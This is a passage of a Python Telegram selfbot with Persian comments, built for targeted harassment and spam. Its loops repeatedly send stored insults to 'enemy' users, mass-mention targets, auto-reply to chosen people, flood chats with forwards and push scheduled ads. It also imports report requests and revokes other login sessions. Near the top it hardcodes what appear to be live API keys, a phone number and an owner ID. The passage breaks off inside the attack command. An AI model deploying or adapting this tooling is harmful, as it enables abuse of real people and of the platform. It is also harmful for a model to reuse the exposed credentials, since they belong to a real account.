#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║        🔥 سلف‌بات حرفه‌ای تلگرام — نسخه PRO 3.0 Ultimate    ║
║   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   ║
║   📢 تبلیغ‌گر خودکار  |  ⚔️ اتکر پیشرفته  |  🛡️ ضد لاگین  ║
╚══════════════════════════════════════════════════════════════╝

نصب وابستگی‌ها:
    pip install telethon pytz

اجرا:
    python selfbot.py
"""

# ═══════════════════════════════════════════════════════════════
#                        کتابخانه‌ها
# ═══════════════════════════════════════════════════════════════
import asyncio
import json
import logging
import random
import re
import time
from datetime import datetime
from pathlib import Path

import pytz
from telethon import TelegramClient, events, functions
from telethon.errors import (
    FloodWaitError,
    MessageIdInvalidError,
    MessageNotModifiedError,
    ChatWriteForbiddenError,
    UserBannedInChannelError,
    ChannelPrivateError,
)
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ReportRequest, ImportChatInviteRequest, ReportSpamRequest

# ═══════════════════════════════════════════════════════════════
#                   ← تنظیمات اصلی — اینجا پر کن →
# ═══════════════════════════════════════════════════════════════
API_ID       = 21010051
API_HASH     = '6d9b1c5bc4db33448ef49cb2aa32e505'
PHONE_NUMBER = '+989151581594'
SESSION_NAME = 'pro_selfbot'
OWNER_ID     = 7435439243

# ═══════════════════════════════════════════════════════════════
#                        ثابت‌های سیستم
# ═══════════════════════════════════════════════════════════════
CONFIG_FILE      = 'selfbot_config.json'
IRAN_TZ          = pytz.timezone('Asia/Tehran')
MSG_LINK_PATTERN = r'https?://t\.me/(?:c/(\d+)|([^/]+))/(\d+)(?:/(\d+))?'

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('selfbot.log', encoding='utf-8'),
        logging.StreamHandler(),
    ]
)
logger = logging.getLogger(__name__)

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)


# ═══════════════════════════════════════════════════════════════
#                    کلاس مرکزی وضعیت
# ═══════════════════════════════════════════════════════════════
class BotState:
    """نگهداری تمام متغیرها و تنظیمات سلف‌بات"""

    def __init__(self):
        # ── ادمین‌ها ──────────────────────────────────────────
        self.admins: set = {OWNER_ID}

        # ── پیام‌های اتک/منشن ─────────────────────────────────
        self.messages: list = []

        # ── دشمنان منشن (setid) ───────────────────────────────
        self.mention_targets: set = set()

        # ── دشمنان پاسخ خودکار (setenemy) ────────────────────
        self.auto_reply_targets: set = set()

        # ── بازه‌های زمانی ────────────────────────────────────
        self.send_interval: int = 10
        self.chat_intervals: dict = {}
        self.spam_interval: int = 0
        self.report_interval: int = 5
        self.zmn_interval: int = 0
        self.attack_interval: int = 1

        # ── وضعیت‌های فعال ────────────────────────────────────
        self.auto_send: bool = False
        self.auto_reply: bool = False
        self.bot_active: bool = True
        self.bot_all_active: bool = True
        self.tag_enabled: bool = True
        self.zmn_enabled: bool = False
        self.mutepv_enabled: bool = False
        self.muted_chats: set = set()
        self.spam_active: bool = False
        self.attack_active: bool = False

        # ── ظاهر ──────────────────────────────────────────────
        self.mention_emoji: str = '👾'
        self.command_prefixes: set = set()

        # ── ضد لاگین ──────────────────────────────────────────
        self.anti_login_enabled: bool = False
        self.alogin_enabled: bool = True
        self.allowed_sessions: set = set()
        self.destination: str = '@HelperAttacker_Bot'

        # ── تایمر ─────────────────────────────────────────────
        self.active_timer: tuple = None

        # ── ZMN (تأخیر پاسخ) ──────────────────────────────────
        self.user_last_response: dict = {}

        # ── هدف‌های اتک ───────────────────────────────────────
        self.attack_targets: set = set()

        # ── سیستم تبلیغات ─────────────────────────────────────
        self.ads_active: bool = False
        self.ads_messages: list = []
        self.ads_targets: list = []
        self.ads_interval: int = 300
        self.ads_mode: str = 'random'   # 'random' یا 'sequential'
        self.ads_index: int = 0

        # ── تسک‌های asyncio ───────────────────────────────────
        self.timer_task: asyncio.Task = None
        self.anti_login_task: asyncio.Task = None
        self.attack_task: asyncio.Task = None
        self.ads_task: asyncio.Task = None

    # ─────────────────────────────────────────────────────────
    def save(self):
        """ذخیره تنظیمات در فایل JSON"""
        try:
            data = {
                'admins':              list(self.admins),
                'messages':            self.messages,
                'mention_targets':     list(self.mention_targets),
                'auto_reply_targets':  list(self.auto_reply_targets),
                'send_interval':       self.send_interval,
                'chat_intervals':      {str(k): v for k, v in self.chat_intervals.items()},
                'spam_interval':       self.spam_interval,
                'report_interval':     self.report_interval,
                'zmn_interval':        self.zmn_interval,
                'attack_interval':     self.attack_interval,
                'tag_enabled':         self.tag_enabled,
                'zmn_enabled':         self.zmn_enabled,
                'mutepv_enabled':      self.mutepv_enabled,
                'muted_chats':         list(self.muted_chats),
                'mention_emoji':       self.mention_emoji,
                'command_prefixes':    list(self.command_prefixes),
                'destination':         self.destination,
                'allowed_sessions':    list(self.allowed_sessions),
                'attack_targets':      list(self.attack_targets),
                'ads_messages':        self.ads_messages,
                'ads_targets':         self.ads_targets,
                'ads_interval':        self.ads_interval,
                'ads_mode':            self.ads_mode,
                'alogin_enabled':      self.alogin_enabled,
            }
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f'خطا در ذخیره: {e}')

    def load(self):
        """بارگذاری تنظیمات از فایل JSON"""
        if not Path(CONFIG_FILE).exists():
            return
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
            self.admins             = set(d.get('admins', [OWNER_ID])) | {OWNER_ID}
            self.messages           = d.get('messages', [])
            self.mention_targets    = set(d.get('mention_targets', []))
            self.auto_reply_targets = set(d.get('auto_reply_targets', []))
            self.send_interval      = d.get('send_interval', 10)
            self.chat_intervals     = {int(k): v for k, v in d.get('chat_intervals', {}).items()}
            self.spam_interval      = d.get('spam_interval', 0)
            self.report_interval    = d.get('report_interval', 5)
            self.zmn_interval       = d.get('zmn_interval', 0)
            self.attack_interval    = d.get('attack_interval', 1)
            self.tag_enabled        = d.get('tag_enabled', True)
            self.zmn_enabled        = d.get('zmn_enabled', False)
            self.mutepv_enabled     = d.get('mutepv_enabled', False)
            self.muted_chats        = set(d.get('muted_chats', []))
            self.mention_emoji      = d.get('mention_emoji', '👾')
            self.command_prefixes   = set(d.get('command_prefixes', []))
            self.destination        = d.get('destination', '@HelperAttacker_Bot')
            self.allowed_sessions   = set(d.get('allowed_sessions', []))
            self.attack_targets     = set(d.get('attack_targets', []))
            self.ads_messages       = d.get('ads_messages', [])
            self.ads_targets        = d.get('ads_targets', [])
            self.ads_interval       = d.get('ads_interval', 300)
            self.ads_mode           = d.get('ads_mode', 'random')
            self.alogin_enabled     = d.get('alogin_enabled', True)
            logger.info('تنظیمات بارگذاری شد')
        except Exception as e:
            logger.error(f'خطا در بارگذاری: {e}')


st = BotState()


# ═══════════════════════════════════════════════════════════════
#                      توابع کمکی عمومی
# ═══════════════════════════════════════════════════════════════
async def safe_reply(event, text: str, parse_mode=None):
    """ویرایش پیام اگر ممکن بود، وگرنه ارسال"""
    try:
        await event.edit(text, parse_mode=parse_mode)
    except Exception:
        try:
            await event.respond(text, parse_mode=parse_mode)
        except Exception as e:
            logger.warning(f'safe_reply شکست خورد: {e}')


async def safe_send(chat_id, text: str, parse_mode='md', reply_to=None):
    """ارسال پیام با مدیریت FloodWait و خطاهای دسترسی"""
    try:
        return await client.send_message(chat_id, text, parse_mode=parse_mode, reply_to=reply_to)
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds + 1)
        try:
            return await client.send_message(chat_id, text, parse_mode=parse_mode, reply_to=reply_to)
        except Exception:
            return None
    except (ChatWriteForbiddenError, UserBannedInChannelError, ChannelPrivateError):
        return None
    except Exception as e:
        logger.warning(f'safe_send به {chat_id} شکست خورد: {e}')
        return None


def is_admin(uid: int) -> bool:
    return uid in st.admins

def is_owner(uid: int) -> bool:
    return uid == OWNER_ID

def bot_ok(event) -> bool:
    """بررسی اینکه ربات مجاز به پاسخ‌دهی هست"""
    if not st.bot_all_active:
        return False
    if not st.bot_active and event.chat_id != OWNER_ID:
        return False
    return True

def has_prefix(text: str) -> bool:
    if not st.command_prefixes:
        return True
    return any(text.startswith(p) for p in st.command_prefixes)

def strip_prefix(text: str) -> str:
    for p in st.command_prefixes:
        if text.startswith(p):
            return text[len(p):].strip()
    return text

def build_mention_str() -> str:
    """ساخت رشته منشن برای همه دشمنان"""
    return ' '.join(
        f'[{st.mention_emoji}](tg://user?id={uid})'
        for uid in st.mention_targets
    )

async def resolve_entity(inp: str):
    """تبدیل یوزرنیم/آیدی به آیدی عددی"""
    inp = inp.strip().lstrip('@')
    if inp.lstrip('-').isdigit():
        return int(inp)
    try:
        e = await client.get_entity(inp)
        if hasattr(e, 'megagroup') or hasattr(e, 'broadcast'):
            return int(f'-100{e.id}')
        return e.id
    except Exception:
        return None

async def parse_msg_link(link: str):
    """لینک پیام → (chat_id, message_id)"""
    m = re.match(MSG_LINK_PATTERN, link)
    if not m:
        return None, None
    msg_id = int(m.group(3))
    if m.group(1):
        return int('-100' + m.group(1)), msg_id
    try:
        e = await client.get_entity(m.group(2))
        if hasattr(e, 'megagroup') or hasattr(e, 'broadcast'):
            return int(f'-100{e.id}'), msg_id
        return e.id, msg_id
    except Exception:
        return None, None

def status_text() -> str:
    def flag(v): return '🟢' if v else '🔴'
    return (
        f'╔═══════════════════════════╗\n'
        f'║   📊 وضعیت سلف‌بات PRO   ║\n'
        f'╠═══════════════════════════╣\n'
        f'║ 📢 تبلیغات : {flag(st.ads_active)}\n'
        f'║ ⚔️  اتکر   : {flag(st.attack_active)}\n'
        f'║ 💬 منشن    : {flag(st.auto_send)}\n'
        f'║ 🔄 پاسخ‌خودکار: {flag(st.auto_reply)}\n'
        f'║ 🛡️  ضدلاگین: {flag(st.anti_login_enabled)}\n'
        f'╠═══════════════════════════╣\n'
        f'║ 👑 ادمین‌ها : {len(st.admins)}\n'
        f'║ 💀 دشمنان  : {len(st.mention_targets)}\n'
        f'║ 📝 پیام‌ها  : {len(st.messages)}\n'
        f'║ 📣 هدف‌تبلیغ: {len(st.ads_targets)}\n'
        f'║ ⏱️  بازه    : {st.send_interval}s\n'
        f'╚═══════════════════════════╝'
    )


# ═══════════════════════════════════════════════════════════════
#                       حلقه‌های پس‌زمینه
# ═══════════════════════════════════════════════════════════════
async def _anti_login_loop():
    """هر ۵ ثانیه سشن‌های غیرمجاز رو حذف می‌کنه"""
    while st.anti_login_enabled:
        try:
            await asyncio.sleep(5)
            auths = await client(GetAuthorizationsRequest())
            for a in auths.authorizations:
                if a.current or a.hash in st.allowed_sessions:
                    continue
                try:
                    await client(ResetAuthorizationRequest(hash=a.hash))
                    logger.info(f'[ضدلاگین] سشن {a.hash} حذف شد')
                except Exception as e:
                    logger.warning(f'[ضدلاگین] {e}')
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f'[ضدلاگین] {e}')
            await asyncio.sleep(10)


async def _timer_loop(chat_id: int, msg_id: int):
    """به‌روزرسانی ثانیه‌ای تایمر"""
    while st.active_timer == (chat_id, msg_id):
        try:
            now = datetime.now(IRAN_TZ)
            txt = now.strftime('🕐 %H:%M:%S\n📅 %Y/%m/%d')
            await client.edit_message(chat_id, msg_id, txt)
            await asyncio.sleep(1)
        except (MessageIdInvalidError, asyncio.CancelledError):
            st.active_timer = None
            break
        except MessageNotModifiedError:
            await asyncio.sleep(1)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except Exception as e:
            logger.warning(f'[تایمر] {e}')
            await asyncio.sleep(5)


async def _ads_loop():
    """حلقه تبلیغات خودکار"""
    logger.info('[تبلیغات] شروع')
    while st.ads_active:
        try:
            if not st.ads_messages or not st.ads_targets:
                await asyncio.sleep(10)
                continue

            if st.ads_mode == 'sequential':
                msg = st.ads_messages[st.ads_index % len(st.ads_messages)]
                st.ads_index += 1
            else:
                msg = random.choice(st.ads_messages)

            ok = 0
            for target in list(st.ads_targets):
                try:
                    await safe_send(int(target) if str(target).lstrip('-').isdigit() else target, msg, parse_mode='html')
                    ok += 1
                    await asyncio.sleep(2)
                except Exception as e:
                    logger.warning(f'[تبلیغات] {target}: {e}')

            logger.info(f'[تبلیغات] {ok}/{len(st.ads_targets)} موفق')
            await asyncio.sleep(st.ads_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f'[تبلیغات] {e}')
            await asyncio.sleep(30)


async def _attack_loop(chat_id: int, reply_to=None):
    """حلقه اتک پیوسته"""
    while st.attack_active:
        try:
            if not st.messages:
                await asyncio.sleep(1)
                continue

            msg = random.choice(st.messages)
            if st.attack_targets and st.tag_enabled:
                mentions = ' '.join(
                    f'[{st.mention_emoji}](tg://user?id={uid})'
                    for uid in st.attack_targets
                )
                msg = f'{msg}\n\n{mentions}'

            await safe_send(chat_id, msg, reply_to=reply_to)
            await asyncio.sleep(max(0.5, st.attack_interval))

        except asyncio.CancelledError:
            break
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except Exception as e:
            logger.warning(f'[اتکر] {e}')
            await asyncio.sleep(5)


def _cancel(task):
    if task and not task.done():
        task.cancel()


# ═══════════════════════════════════════════════════════════════
#               دستورات وضعیت و اطلاعات
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^(status|وضعیت)$'))
async def cmd_status(event):
    if not is_admin(event.sender_id): return
    await safe_reply(event, status_text())


@client.on(events.NewMessage(outgoing=True, pattern=r'^ping$'))
async def cmd_ping(event):
    if not is_admin(event.sender_id): return
    t = time.time()
    await safe_reply(event, '⚡ ...')
    ms = round((time.time() - t) * 1000, 2)
    await safe_reply(event, f'🏓 پینگ: **{ms}ms**')


@client.on(events.NewMessage(outgoing=True, pattern=r'^(gpid|chatid)$'))
async def cmd_chat_id(event):
    if not is_admin(event.sender_id): return
    await safe_reply(event, f'🆔 آیدی چت: `{event.chat_id}`')


@client.on(events.NewMessage(outgoing=True, pattern=r'^id$'))
async def cmd_user_id(event):
    if not is_admin(event.sender_id): return
    if event.is_reply:
        rep = await event.get_reply_message()
        await safe_reply(event, f'🆔 آیدی کاربر: `{rep.sender_id}`')
    else:
        await safe_reply(event, f'🆔 آیدی شما: `{event.sender_id}`')


# ═══════════════════════════════════════════════════════════════
#               کنترل ربات (on/off)
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^bot (on|off)$'))
async def cmd_bot(event):
    if not is_admin(event.sender_id): return
    st.bot_active = event.pattern_match.group(1) == 'on'
    await safe_reply(event, f'🤖 ربات: {"✅ فعال" if st.bot_active else "❌ خاموش"}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^bot all (on|off)$'))
async def cmd_bot_all(event):
    if not is_admin(event.sender_id): return
    st.bot_all_active = event.pattern_match.group(1) == 'on'
    await safe_reply(event, f'🌐 ربات سراسری: {"✅ فعال" if st.bot_all_active else "❌ خاموش"}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^stop$'))
async def cmd_stop(event):
    if not is_admin(event.sender_id): return
    st.auto_send = False
    st.auto_reply = False
    st.spam_active = False
    st.attack_active = False
    st.active_timer = None
    _cancel(st.timer_task)
    _cancel(st.attack_task)
    await safe_reply(event, '⏹️ همه عملیات متوقف شدند.')


# ═══════════════════════════════════════════════════════════════
#                        میوت
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^mutepv (on|off)$'))
async def cmd_mutepv(event):
    if not is_admin(event.sender_id): return
    st.mutepv_enabled = event.pattern_match.group(1) == 'on'
    st.save()
    await safe_reply(event, f'🔇 میوت پیوی: {"✅ فعال" if st.mutepv_enabled else "❌ غیرفعال"}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^mute (on|off)$'))
async def cmd_mute(event):
    if not is_admin(event.sender_id): return
    if event.pattern_match.group(1) == 'on':
        st.muted_chats.add(event.chat_id)
        await safe_reply(event, f'🔇 چت {event.chat_id} میوت شد.')
    else:
        st.muted_chats.discard(event.chat_id)
        await safe_reply(event, f'🔊 میوت چت {event.chat_id} برداشته شد.')
    st.save()


@client.on(events.NewMessage(incoming=True))
async def handle_mute_delete(event):
    """حذف پیام‌های ورودی در چت‌های میوت یا پیوی‌های میوت"""
    if event.chat_id in st.muted_chats:
        try: await event.delete()
        except Exception: pass
    elif st.mutepv_enabled and event.is_private and not event.out:
        try: await event.delete()
        except Exception: pass


# ═══════════════════════════════════════════════════════════════
#                    مدیریت پیام‌ها
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^addfosh\s+([\s\S]+)'))
async def cmd_addfosh(event):
    if not is_admin(event.sender_id): return
    raw = event.pattern_match.group(1).strip()
    triple = re.match(r'"""([\s\S]*?)"""', raw)
    if triple:
        st.messages.append(triple.group(1).strip())
        count = 1
    else:
        lines = [l.strip() for l in raw.splitlines() if l.strip()]
        st.messages.extend(lines)
        count = len(lines)
    st.save()
    await safe_reply(event, f'✅ {count} پیام اضافه شد. جمع: {len(st.messages)}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^addlistfosh$'))
async def cmd_addlistfosh(event):
    if not is_admin(event.sender_id): return
    if not event.is_reply:
        await safe_reply(event, '❗ روی فایل .txt ریپلای بزن.')
        return
    rep = await event.get_reply_message()
    if not rep.file or not rep.file.name.endswith('.txt'):
        await safe_reply(event, '❗ فایل باید .txt باشد.')
        return
    try:
        content = await rep.download_media(bytes)
        lines = [l.strip() for l in content.decode('utf-8').splitlines() if l.strip()]
        st.messages.extend(lines)
        st.save()
        await safe_reply(event, f'✅ {len(lines)} پیام از فایل اضافه شد.')
    except Exception as e:
        await safe_reply(event, f'❌ خطا: {e}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^delfosh (.+)$'))
async def cmd_delfosh(event):
    if not is_admin(event.sender_id): return
    txt = event.pattern_match.group(1).strip()
    if txt in st.messages:
        st.messages.remove(txt)
        st.save()
        await safe_reply(event, '✅ پیام حذف شد.')
    else:
        await safe_reply(event, '❌ پیام پیدا نشد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanfosh$'))
async def cmd_cleanfosh(event):
    if not is_admin(event.sender_id): return
    n = len(st.messages)
    st.messages.clear()
    st.save()
    await safe_reply(event, f'🗑️ {n} پیام حذف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^listfosh$'))
async def cmd_listfosh(event):
    if not is_admin(event.sender_id): return
    if not st.messages:
        await safe_reply(event, '📭 لیست خالیه.')
        return
    lines = [f'{i}. `{m[:60]}{"..." if len(m)>60 else ""}`' for i, m in enumerate(st.messages[:20], 1)]
    extra = f'\n... و {len(st.messages)-20} پیام دیگه' if len(st.messages) > 20 else ''
    await safe_reply(event, f'📋 **پیام‌ها ({len(st.messages)}):**\n' + '\n'.join(lines) + extra)


# ═══════════════════════════════════════════════════════════════
#                 دشمنان منشن (setid)
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^setid(?:\s+(.+))?$'))
async def cmd_setid(event):
    if not is_admin(event.sender_id): return
    if event.is_reply:
        rep = await event.get_reply_message()
        st.mention_targets.add(rep.sender_id)
        st.save()
        await safe_reply(event, f'🎯 `{rep.sender_id}` به لیست منشن اضافه شد.')
        return
    arg = event.pattern_match.group(1)
    if not arg:
        await safe_reply(event, '❗ آیدی/یوزرنیم یا ریپلای لازمه.')
        return
    added = []
    for inp in arg.split():
        uid = await resolve_entity(inp)
        if uid:
            st.mention_targets.add(uid)
            added.append(str(uid))
    if added:
        st.save()
        await safe_reply(event, f'✅ اضافه شد: {", ".join(added)}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^delid(?:\s+(.+))?$'))
async def cmd_delid(event):
    if not is_admin(event.sender_id): return
    if event.is_reply:
        rep = await event.get_reply_message()
        st.mention_targets.discard(rep.sender_id)
        st.save()
        await safe_reply(event, f'✅ `{rep.sender_id}` از لیست منشن حذف شد.')
        return
    arg = event.pattern_match.group(1)
    if arg:
        for inp in arg.split():
            uid = await resolve_entity(inp)
            if uid:
                st.mention_targets.discard(uid)
        st.save()
        await safe_reply(event, '✅ حذف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanid$'))
async def cmd_cleanid(event):
    if not is_admin(event.sender_id): return
    n = len(st.mention_targets)
    st.mention_targets.clear()
    st.save()
    await safe_reply(event, f'🗑️ {n} نفر از لیست منشن حذف شدند.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^listid$'))
async def cmd_listid(event):
    if not is_admin(event.sender_id): return
    if not st.mention_targets:
        await safe_reply(event, '📭 لیست منشن خالیه.')
        return
    lines = [f'• `{uid}`' for uid in st.mention_targets]
    await safe_reply(event, f'🎯 **دشمنان ({len(st.mention_targets)}):**\n' + '\n'.join(lines))


# ═══════════════════════════════════════════════════════════════
#              دشمنان پاسخ خودکار (setenemy)
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^setenemy(?:\s+(\d+))?$'))
async def cmd_setenemy(event):
    if not is_admin(event.sender_id): return
    uid = None
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
    elif event.pattern_match.group(1):
        uid = int(event.pattern_match.group(1))
    if uid:
        st.auto_reply_targets.add(uid)
        st.save()
        await safe_reply(event, f'🔒 `{uid}` قفل پاسخ شد.')
    else:
        await safe_reply(event, '❗ آیدی یا ریپلای لازمه.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^delenemy(?:\s+(\d+))?$'))
async def cmd_delenemy(event):
    if not is_admin(event.sender_id): return
    uid = None
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
    elif event.pattern_match.group(1):
        uid = int(event.pattern_match.group(1))
    if uid:
        st.auto_reply_targets.discard(uid)
        st.save()
        await safe_reply(event, f'🔓 قفل `{uid}` برداشته شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanenemy$'))
async def cmd_cleanenemy(event):
    if not is_admin(event.sender_id): return
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
        st.auto_reply_targets.discard(uid)
        await safe_reply(event, f'✅ `{uid}` حذف شد.')
    else:
        n = len(st.auto_reply_targets)
        st.auto_reply_targets.clear()
        await safe_reply(event, f'🗑️ {n} دشمن حذف شدند.')
    st.save()


# ═══════════════════════════════════════════════════════════════
#                   پاسخ خودکار به دشمنان
# ═══════════════════════════════════════════════════════════════
_CMD_SKIP = frozenset([
    'status', 'وضعیت', 'ping', 'gpid', 'chatid', 'id', 'addfosh', 'addlistfosh',
    'cleanfosh', 'delfosh', 'listfosh', 'setid', 'delid', 'cleanid', 'listid',
    'setenemy', 'delenemy', 'cleanenemy', 'start', 'stop', 'setrep', 'settime',
    'setadmin', 'deladmin', 'cleanadmins', 'adminlist', 'bot', 'settimer',
    'stoptimer', 'timerstatus', 'allowcurrent', 'antilogin', 'alogin',
    'spam', 'spstop', 'stimer', '!spam', 'mute', 'mutepv', 'setalamat',
    'delalamat', 'setemoji', 'tag', 'setzmn', 'zmnenemy', 'report', 'setreptime',
    'attack', 'stopatk', 'setatktime', 'addatk', 'delatk', 'cleanatk',
    'addads', 'cleanads', 'addadstarget', 'deladstarget', 'cleanadstarget',
    'listads', 'setadstime', 'adsmode', 'startads', 'stopads',
    'join', 'leave', 'save', 'reset', 'help',
])

@client.on(events.NewMessage(incoming=True))
async def auto_reply_handler(event):
    if not bot_ok(event): return
    if event.sender_id not in st.auto_reply_targets: return
    if not st.messages: return
    first_word = event.raw_text.strip().split()[0].lower() if event.raw_text.strip() else ''
    if first_word in _CMD_SKIP: return

    if st.zmn_enabled and st.zmn_interval > 0:
        now = time.time()
        if now - st.user_last_response.get(event.sender_id, 0) < st.zmn_interval:
            return
        st.user_last_response[event.sender_id] = now

    await safe_send(event.chat_id, random.choice(st.messages), reply_to=event.id)


# ═══════════════════════════════════════════════════════════════
#                 منشن و ارسال خودکار
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^start(?:\s+(.+))?$'))
async def cmd_start(event):
    if not is_admin(event.sender_id): return
    if not st.messages:
        await safe_reply(event, '❗ لیست پیام‌ها خالیه. با `addfosh` پیام اضافه کن.')
        return

    st.auto_send = True
    inp = event.pattern_match.group(1)
    chat_id = event.chat_id
    if inp:
        r = await resolve_entity(inp.strip())
        if r: chat_id = r

    reply_to = event.message.reply_to.reply_to_msg_id if event.message.reply_to else None
    interval = st.chat_intervals.get(chat_id, st.send_interval)
    await safe_reply(event, f'▶️ منشن شروع شد — هر {interval}s')

    while st.auto_send:
        try:
            msg = random.choice(st.messages)
            if st.mention_targets and st.tag_enabled:
                msg = f'{msg}\n\n{build_mention_str()}'
            await safe_send(chat_id, msg, reply_to=reply_to)
            await asyncio.sleep(interval)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.warning(f'[منشن] {e}')
            await asyncio.sleep(5)


@client.on(events.NewMessage(outgoing=True, pattern=r'^setrep$'))
async def cmd_setrep(event):
    if not is_admin(event.sender_id): return
    if not st.messages:
        await safe_reply(event, '❗ لیست پیام‌ها خالیه.')
        return
    if not event.is_reply:
        await safe_reply(event, '❗ روی پیام ریپلای بزن.')
        return

    st.auto_reply = True
    rep = await event.get_reply_message()
    rid = rep.id
    await safe_reply(event, '▶️ پاسخ خودکار شروع شد.')

    while st.auto_reply:
        try:
            await safe_send(event.chat_id, random.choice(st.messages), reply_to=rid)
            await asyncio.sleep(st.send_interval)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.warning(f'[setrep] {e}')
            await asyncio.sleep(5)


# ═══════════════════════════════════════════════════════════════
#                    تنظیمات ارسال
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^settime (\d+)(?:\s+(.+))?$'))
async def cmd_settime(event):
    if not is_admin(event.sender_id): return
    interval = int(event.pattern_match.group(1))
    inp = event.pattern_match.group(2)
    if inp:
        cid = await resolve_entity(inp.strip())
        if cid:
            st.chat_intervals[cid] = interval
            await safe_reply(event, f'⏱️ بازه {interval}s برای چت `{cid}`')
    else:
        st.send_interval = interval
        await safe_reply(event, f'⏱️ بازه کلی: {interval}s')
    st.save()


@client.on(events.NewMessage(outgoing=True, pattern=r'^stimer (\d+)$'))
async def cmd_stimer(event):
    if not is_admin(event.sender_id): return
    st.spam_interval = max(0, int(event.pattern_match.group(1)))
    st.save()
    await safe_reply(event, f'⏱️ تأخیر اسپم: {st.spam_interval}s')


@client.on(events.NewMessage(outgoing=True, pattern=r'^setemoji (.+)$'))
async def cmd_setemoji(event):
    if not is_admin(event.sender_id): return
    st.mention_emoji = event.pattern_match.group(1).strip()
    st.save()
    await safe_reply(event, f'✅ ایموجی: {st.mention_emoji}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^tag (on|off)$'))
async def cmd_tag(event):
    if not is_admin(event.sender_id): return
    st.tag_enabled = event.pattern_match.group(1) == 'on'
    st.save()
    await safe_reply(event, f'🏷️ منشن: {"✅ فعال" if st.tag_enabled else "❌ غیرفعال"}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^setalamat (.+)$'))
async def cmd_setalamat(event):
    if not is_admin(event.sender_id): return
    p = event.pattern_match.group(1).strip()
    st.command_prefixes.add(p)
    st.save()
    await safe_reply(event, f'✅ پریفیکس «{p}» اضافه شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^delalamat (.+)$'))
async def cmd_delalamat(event):
    if not is_admin(event.sender_id): return
    p = event.pattern_match.group(1).strip()
    st.command_prefixes.discard(p)
    st.save()
    await safe_reply(event, f'✅ پریفیکس «{p}» حذف شد.')


# ═══════════════════════════════════════════════════════════════
#                       اسپم
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^spam (\d+)(?:\s+([\s\S]+))?$'))
async def cmd_spam(event):
    if not is_admin(event.sender_id): return
    st.spam_active = True
    count = int(event.pattern_match.group(1))
    text  = event.pattern_match.group(2)
    reply_to = event.message.reply_to.reply_to_msg_id if event.message.reply_to else None
    try: await event.delete()
    except Exception: pass

    for _ in range(count):
        if not st.spam_active: break
        if text:
            await safe_send(event.chat_id, text, reply_to=reply_to)
        elif event.is_reply:
            rep = await event.get_reply_message()
            if rep.media:
                try:
                    await client.send_file(event.chat_id, rep.media, reply_to=reply_to)
                except Exception: pass
            else:
                await safe_send(event.chat_id, rep.text or '.', reply_to=reply_to)
        elif st.messages:
            await safe_send(event.chat_id, random.choice(st.messages), reply_to=reply_to)

        if st.spam_interval > 0:
            await asyncio.sleep(st.spam_interval)


@client.on(events.NewMessage(outgoing=True, pattern=r'^!spam$'))
async def cmd_instant_spam(event):
    if not is_admin(event.sender_id): return
    if not event.is_reply:
        await safe_reply(event, '❗ روی پیام ریپلای بزن.')
        return
    try: await event.delete()
    except Exception: pass
    rep = await event.get_reply_message()
    for _ in range(50):
        try:
            await client.forward_messages(event.chat_id, rep.id, event.chat_id)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except Exception:
            break


@client.on(events.NewMessage(outgoing=True, pattern=r'^spstop$'))
async def cmd_spstop(event):
    if not is_admin(event.sender_id): return
    st.spam_active = False
    await safe_reply(event, '⏹️ اسپم متوقف شد.')


# ═══════════════════════════════════════════════════════════════
#                    ⚔️ اتکر پیشرفته
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^attack$'))
async def cmd_attack(event):
    if not is_admin(event.sender_id): return
    if not st.messages:
        await safe_reply(event, '❗ لیست پیام‌ها خالیه.')
